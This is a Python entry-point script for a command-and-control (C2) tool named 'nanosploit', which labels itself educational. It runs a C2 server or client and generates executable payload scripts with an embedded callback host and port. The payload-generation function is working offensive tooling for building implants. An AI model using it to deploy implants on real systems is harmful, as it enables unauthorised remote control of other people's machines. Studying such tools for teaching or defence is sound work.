import argparse
import os
import stat

from nanosploit.server import main as server
from nanosploit.client import main as client
import nanosploit.client as payload_module

# Static globals
SHEBANG = "#!/usr/bin/env python3\n"


def export_payload(dest_path: str, host: str, port: int):
    # Get script content
    with open(payload_module.__file__, "r") as f:
        payload_script = f.read()

    # Add shebang
    payload_script = SHEBANG + f"HOST,PORT='{host}',{port}\n" + payload_script

    # Write to dest path
    with open(dest_path, "w") as f:
        f.write(payload_script)

    # Make file executable
    st = os.stat(dest_path)
    os.chmod(dest_path, st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    print(f"Created payload script at '{dest_path}'")


def main():
    # Create the argument parser
    parser = argparse.ArgumentParser(
        prog="nanosploit",
        description="Minimalist C2 server for educational purpose."
    )
    # Add the server and client choices with server as default
    parser.add_argument(
        "mode",
        choices=["server", "client", "generate"],
        help="Choose either 'server' or 'client' mode",
        nargs="?",
        default="server"
    )
    # Add the payload export argument
    parser.add_argument("--path", metavar='filename', help="Export the client payload", required=False)
    parser.add_argument("--host", metavar="host", help="Server host IP address", required=False)
    parser.add_argument("--port", metavar="port", type=int, help="Server host port", required=False)

    # Execute server or client script
    args = parser.parse_args()
    match args.mode:
        case "server":
            server()
        case "client":
            client()
        case "generate":
            if args.path and args.host and args.port:
                export_payload(args.path, args.host, args.port)
            else:
                print("Error: missing config argument")


if __name__ == '__main__':
    main()
